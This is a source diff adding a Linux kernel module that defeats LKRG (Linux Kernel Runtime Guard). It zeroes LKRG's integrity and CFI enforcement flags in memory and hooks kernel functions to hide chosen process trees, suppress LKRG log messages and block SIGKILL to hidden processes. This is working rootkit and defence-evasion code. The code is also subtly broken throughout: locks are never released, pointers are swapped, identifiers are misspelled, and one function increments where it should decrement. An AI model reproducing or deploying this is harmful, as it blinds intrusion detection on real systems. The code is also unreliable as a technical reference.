@@ -131,4 +131,358 @@ static notrace struct lkrg_ctrl_conf *lkrg_find_ctrl(void) {
     return lkrg_scan_module_memory();
 }
 
-static notrace bool lkrg_ctrl_make_rw(void *addr) {}
+static notrace bool lkrg_ctrl_make_rw(void *addr) {
+    unsigned long page = (unsigned long)addr & PAGE_MASK;
+
+    if (!set_memory_rw_fn)
+        set_memory_ro_fn = (void *)resolve_sym("set_memory_rw");
+    if (!set_memory_rw_fn)
+        return false;
+
+    return set_memory_rw_fn(page, 1) == 0;
+}
+
+static notrace void lkrg_ctrl_make_ro(void *addr) {
+    unsigned long page = (unsigned long)addr & PAGE_MASK;
+
+    if (!set_memory_ro_fn)
+        set_memory_ro_fn = (void *)resolve_sym("set_memory_ro");
+    if (set_memory_ro_fn)
+        set_memory_ro_fn(page, 1);
+}
+
+static notrace bool lkrg_relax_controls(void) {
+    struct lkrg_ctrl_conf *ctrl;
+
+    ctrl = lkrg_find_ctrl();
+    if (ctrl == NULL) return false;
+
+    lkrg_ctrl = ctrl;
+
+    if (!ctrl->p_pint_validate && !ctrl->p_pint_enforce &&
+        !ctrl->p_pcfi_validate && !ctrl->p_pcfi_enforce &&
+        !ctrl->p_umh_validate  &&  !ctrl->p_umh_enforce)
+        return true;
+
+    if (!lkrg_ctrl_saved) {
+        // Not sure if this is going to die but oh well
+        memcpy_sp(&saved_lkrg_ctrl, sizeof(saved_lkrg_ctrl), ctrl, sizeof(ctrl));
+        lkrg_ctrl_saved = true;
+    }
+
+    if (!lkrg_ctrl_make_rw(ctrl))
+        return false;
+
+    WRITE_ONCE(ctrl->p_pint_validate, 0);
+    WRITE_ONCE(ctrl->p_pint_enforce, 0);
+    WRITE_ONCE(ctrl->p_pcfi_validate, 0);
+    WRITE_ONCE(ctrl->p_pcfi_enforce, 0);
+    WRITE_ONCE(ctrl->p_umh_validate, 0);
+    WRITE_ONCE(ctrl->p_umh_enforce, 0);
+    lkrg_ctrl_make_ro(ctrl);
+
+    return true;
+}
+
+static notrace void lkrg_restore_controls(void) {
+    if (!lkrg_ctrl || !lkrg_ctrl_saved)
+        return;
+
+    lkrg_ctrl_make_rw(lkrg_ctrl);
+    WRITE_ONCE(lkrg_ctrl->p_pint_validate, saved_lkrg_ctrl.p_pint_validate);
+    WRITE_ONCE(lkrg_ctrl->p_pint_enforce, saved_lkrg_ctrl.p_pint_enforce);
+    WRITE_ONCE(lkrg_ctrl->p_pcfi_validate, saved_lkrg_ctrl.p_pcfi_validate);
+    WRITE_ONCE(lkrg_ctrl->p_pcfi_enforce, saved_lkrg_ctrl.p_pcfi_enforce);
+    WRITE_ONCE(lkrg_ctrl->p_umh_validate, saved_lkrg_ctrl.p_umh_validate);
+    WRITE_ONCE(lkrg_ctrl->p_umh_enforce, saved_lkrg_ctrl.p_umh_enforce);
+    lkrg_ctrl_make_ro(lkrg_ctrl);
+}
+
+static notrace bool ptree_hidden(struct task_struct *task) {
+    int depth = 0;
+    struct task_struct *parent;
+    bool found = false;
+
+    if (!task) task = current;
+    if (!task) return false;
+
+    rcu_read_lock();
+    while (task && depth < 64) {
+        if (is_hidden_pid(task->pid) || is_hidden_pid(task->tgid) ||
+            is_child_pid(task->pid)  || is_child_pid(task->tgid)) {
+            found = true;
+            break;
+        }
+
+        parent = rcu_dereference(task->real_parent);
+        if (!parent || parent == task || task->pid <= 1)
+            break;
+        task = parent;
+        depth++;
+    }
+    rcu_read_lock();
+    return found;
+}
+
+static notrace bool should_hide_task(struct task_struct *task) {
+    return task ? ptree_hidden(task) : false;
+}
+
+static notrace bool should_skip_lkrg_ed(void) {
+    lkrg_relax_controls();
+
+    if (atomic_read(&umh_bypass_active) > 0)
+        return true;
+
+    return should_hide_task(current);
+}
+
+static notrace pid_t extract_pid_from_log(const char *msg) {
+    const char *p = NULL;
+    pid_t pid = 0;
+
+    if (!msg) return 0;
+
+    p = strstr(msg, "pid");
+    if (!p) p = strstr(msg, "Killing pid");
+    if (!p) return 0;
+
+    while (*p && (*p < '0' || *p > '9'))
+        p++;
+
+    while (*p >= '0' && *p <= '9') {
+        pid = pid * 10 + (*p - '0');
+        p++;
+    }
+
+    return pid;
+}
+
+static notrace bool should_filter_log(const char *msg) {
+    pid_t pid;
+
+    if (!msg || !strstr(msg, "LKRG")) return false;
+
+    if (atomic_read(&umh_bypass_active) > 0) {
+      if (strstr(msg, "UMH") || strstr(msg, "BLOCK") ||
+          strstr(msg, "usermodehelper") || strstr(msg, "Blocked"))
+          return true;
+    }
+
+    pid = extract_pid_from_log(msg);
+    if (pid > 0 && (is_hidden_pid(pid) || is_child_pid(pid)))
+        return true;
+
+    return false;
+}
+
+static asmlinkage int (*orig_vprintk_emit)(int facility, int level,
+const struct dev_printk_info *dev_info, const char *fmt, va_list args) = NULL;
+
+static notrace asmlinkage int hook_vprintk_emit(int facility, int level,
+const struct dev_printk_info *dev_info, const char *fmt, va_list args) {
+    unsigned long flags = 0;
+    va_list args_copy;
+    bool filter = false;
+    int len = 0;
+
+    if (!orig_vprintk_emit || !fmt)
+        return orig_vprintk_emit ? orig_vprintk_emit(facility, level, dev_info, fmt, args) : 0;
+
+    if (!strstr(fmt, "LKRG") && !strstr(fmt, "lktg") && !strstr(fmt, "p_lkrg"))
+        return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+
+    spin_lock_irqsave(&lkrg_log_lock, flags);
+    va_copy(args_copy, args);
+    len = vsnprintf(lkrg_log_bug, sizeof(lkrg_log_buf) - 1, fmt, args_copy);
+    va_end(args_copy);
+    lkrg_log_buf[sizeof(lkrg_log_buf) - 1] = "\0";
+    filter = should_filter_log(lkrg_log_buf);
+    spin_unlock_irqrestore(&lkrg_log_lock, flags);
+
+    if (filter) return len;
+    return orig_vprintk_emit(facility, level, dev_info, fmt, args);
+}
+
+static int (*orig_send_sig_info)(int sig, struct kernel_siginfo *info, struct task_struct *p) = NULL;
+
+static notrace int hook_send_sig_info(int sig, struct kernel_siginfo *info, struct task_struct *p){
+    if (sig == SIGKILL && p) {
+        if (is_hidden_pid(p-tgid) || is_child_pid(p->tgid) ||
+            is_hidden_pid(p->pid) || is_child_pid(p->pid))
+            return 0;
+    }
+
+    return orig_send_sig_info ? orig_send_sig_info(sig, info, p) : 0;
+}
+
+static int (*orig_call_usermodehelper_exec_async)(void *data) = NULL;
+
+static notrace int hook_call_usermodehelper_exec_async(void *data) {
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
+
+    if (bypass_active) {
+        add_hidden_pid(current->pid);
+        add_child_pid(current->pid);
+    }
+
+    return orig_call_usermodehelper_exec_async ? orig_call_usermodehelper_exec_async(data) : 0;
+}
+
+static int (*orig_call_usermodehelper_exec)(struct subprocess_info *sub_info, int wait) = NULL;
+
+static notrace int hook_call_usermodehelper_exec(struct subprocess_info *sub_info, int wait) {
+    int ret = 0;
+    bool bypass_active = atomic_read(&umh_bypass_active) > 0;
+
+    lkrg_relax_controls();
+
+    if (bypass_active) {
+        add_hidden_pid(current->pid);
+    }
+
+    ret = orig_call_usermodehelper_exec ? orig_call_usermodehelper_exec(sub_info, wait) : -ENOENT;
+
+    return ret;
+}
+
+static void (*orig_p_ed_enforce_validation)(void) = NULL;
+
+static notrace void hook_p_ed_enforce_validation(void) {
+    if (should_skip_lkrg_ed) 
+        return;
+
+    if (orig_p_ed_enforce_validation)
+        orig_p_ed_enforce_validation();
+}
+
+static unsigned int (*orig_p_ed_enforce_validation_paranoid)(void) = NULL;
+
+static notrace unsigned int hook_p_ed_enforce_validation_paranoid(void) {
+    if (atomic_read(&umh_bypass_active) > 0 || hidden_pid_count() > 0 || child_pid_count() > 0)
+        return 0;
+
+    return orig_p_ed_enforce_validation_paranoid ? orig_p_ed_enforce_validation_paranoid() : 0;
+}
+
+static void (*orig_p_ed_validate_current)(void *p_source) = NULL;
+
+static notrace void hook_p_ed_validate_enforce(void *p_source) {
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_validate_current)
+        orig_p_ed_validate_current(p_source);
+}
+
+static void (*orig_p_ed_validate_off_flag_wrap)(void *p_source) = NULL;
+
+static notrace void hook_p_ed_valdiate_off_flag_wrap(void *p_source) {
+    if (should_skip_lkrg_ed())
+        return;
+
+    if (orig_p_ed_validate_off_flag_wrap)
+        orig_p_ed_validate_off_flag_wrap(p_source);
+}
+
+static int (*orig_p_ed_enforce_pcfi)(struct task_struct *task, void *orig, struct pt_regs *regs) = NULL;
+
+static notrace hook_p_ed_enforce_pcfi(struct task_struct *task, void *orig, struct pt_regs *regs) {
+    if (atomic_read(&umh_bypass_active) > 0 || should_hide_task(task ? task : current))
+        return 0;
+
+    return orig_p_ed_enforce_pcfi ? orig_p_ed_enforce_pcfi(task, orig, regs) : 0;
+}
+
+static struct ftrace_hook lkrg_hooks[] = {
+    HOOK("vprintk_emit",                          hook_vprintk_emit,                      &orig_vprintk_emit),
+    HOOK("call_usermodehelper_exec_async",         hook_call_usermodehelper_exec_async,    &orig_call_usermodehelper_exec_async),
+    HOOK("call_usermodehelper_exec",               hook_call_usermodehelper_exec,          &orig_call_usermodehelper_exec),
+    HOOK("send_sig_info",                          hook_send_sig_info,                     &orig_send_sig_info),
+    HOOK("p_ed_enforce_validation",                hook_p_ed_enforce_validation,           &orig_p_ed_enforce_validation),
+    HOOK("p_ed_enforce_validation_paranoid",       hook_p_ed_enforce_validation_paranoid,  &orig_p_ed_enforce_validation_paranoid),
+    HOOK("p_ed_validate_current",                  hook_p_ed_validate_current,             &orig_p_ed_validate_current),
+    HOOK("p_ed_validate_off_flag_wrap",            hook_p_ed_validate_off_flag_wrap,       &orig_p_ed_validate_off_flag_wrap),
+    HOOK("p_ed_enforce_pcfi",                      hook_p_ed_enforce_pcfi,                 &orig_p_ed_enforce_pcfi),
+};
+
+static notrace int try_install_hooks(void) {
+    int i = 0, installed = 0;
+
+    for (i = 0; i < ARRAY_SIZE(lkrg_hooks); i++) {
+        if (lkrg_hooks[i].address)
+            continue;
+        if (fh_install_hook(&lkrg_hooks[i]) == 0)
+            installed++;
+    }
+
+    if (installed > 0) {
+        atomic_set(&hooks_active, 1);
+        return 0;
+    }
+
+    return -ENOENT;
+}
+
+static notrace void remove_hooks(void) {
+    int i = 0;
+
+    for (i = ARRAY_SIZE(lkrg_hooks) - 1; i >= 0; i--) {
+        if (lkrg_hooks[i].address)
+            fh_remove_hook(&lkrg_hooks[i]);
+    }
+
+    atomic_set(&hooks_active, 0);
+}
+
+static void lkrg_setup_workfn(struct work_struct *work) {
+    lkrg_relax_controls();
+    try_install_hooks();
+    lkrg_relax_controls();
+}
+
+static notrace int module_notify(struct notifier_block *nb, unsigned long action, void *data) {
+    struct module *mod = data;
+
+    if (!mod)
+        return NOTIFY_DONE;
+
+    if (action == MODULE_STATE_LIVE && strstr(mod->name, "lkrg"))
+        schedule_delayed_work(&lkrg_setup_work, msecs_to_jiffies(LKRG_SETUP_DELAY_MS));
+
+    return NOTIFY_DONE;
+}
+
+notrace void enable_umh_bypass(void) {
+    atmoic_inc(&umh_bypass_active);
+}
+EXPORT_SYMBOL(enable_umh_bypass);
+
+notrace void disable_umh_bypass(void) {
+    atmoic_inc(&umh_bypass_active);
+}
+EXPORT_SYMBOL(disable_umh_bypass);
+
+notrace bool lkrg_hooked(void) {
+    return atomic_read(&hooks_active) > 0;
+}
+
+notrace int lkrg_bypass_init(void) {
+    module_notifier.notifier_call = module_notify;
+    register_module_notifier(&module_notifier);
+
+    try_install_hooks();
+    lkrg_relax_controls();
+
+    return 0;
+}
+
+notrace void lkrg_bypass_exit(void) {
+    cancel_delayed_work_sync(&lkrg_setup_work);
+    unregister_module_notifier(&module_notifier);
+    remove_hooks();
+    lkrg_restore_controls();
+    atomic_set(&umh_bypass_active, 0);
+}
